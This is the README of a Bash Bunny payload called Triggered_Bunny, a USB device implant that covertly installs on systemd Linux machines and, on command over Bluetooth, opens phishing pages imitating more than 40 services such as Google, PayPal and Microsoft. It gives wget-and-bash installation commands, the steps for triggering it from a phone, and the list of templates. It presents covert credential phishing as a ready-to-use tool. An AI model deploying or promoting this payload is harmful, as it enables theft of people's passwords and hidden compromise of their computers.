## About:
* Title: Triggered_Bunny
* Description: Triggered_Bunny covertly executes phishing page on remote triggers.
* AUTHOR: drapl0n
* Version: 1.0
* Category: Phishing/Credentials
* Target: Unix-like operating systems with systemd.
* Attackmodes: HID, ECM_ETHERNET

## Triggered_Bunny: Triggered_Bunny covertly executes phishing page on remote triggers.

### Features:
* Covert payload execution.
* Execution on remote triggers.
* 40+ phishing templates. 
* Killswitch: Trigger to kill phishing instance.
* Automated browser detection.
* Informative logs.

### Installation:
``` 
wget https://github.com/drapl0n/bashbunny-payloads/raw/master/payloads/library/phishing/Triggered_Bunny/triggered_bunny.tar.gz
tar -xf triggered_bunny.tar.gz
cd triggered_bunny
bash install.sh
```

### Usage:

* Install [BLE TooL](https://play.google.com/store/apps/details?id=com.cozyoz.bletool&gl=US) on your phone.
* Choose Gatt Server.
* Tap three dots on top corner of the screen.
* Select "set Advertising".
* Change Device name to phishing template you want to execute.
* Change Tx Power Level accordingly.
* Start Advertising to execute payload.
* Change Device name to "killswitch" to kill phishing instance.

### List of templates:

adobe		badoo		deviantart	discord
dropbox		ebay		facebook	fb_advanced
fb_messenger	fb_security	github		gitlab
google		google_new	google_poll	ig_verify
insta_followers	instagram	linkedin	mediafire
microsoft	netflix		origin		paypal
pinterest	playstation	protonmail	quora
reddit		snapchat	spotify		stackoverflow
steam		tiktok		twitch		twitter
vk		vk_poll		wordpress	xbox
yahoo		yandex

### LED Status:

* `INITIALIZING PAYLOAD`        : YELLOW
* `READY TO RECEIVE TRIGGERS`   : BLUE
* `WAITING FOR KILLSWITCH`      : MAGENTA
* `PAYLOAD EXECUTION COMPLETED` : GREEN

#### Support me if you like my work:
* https://twitter.com/drapl0n 
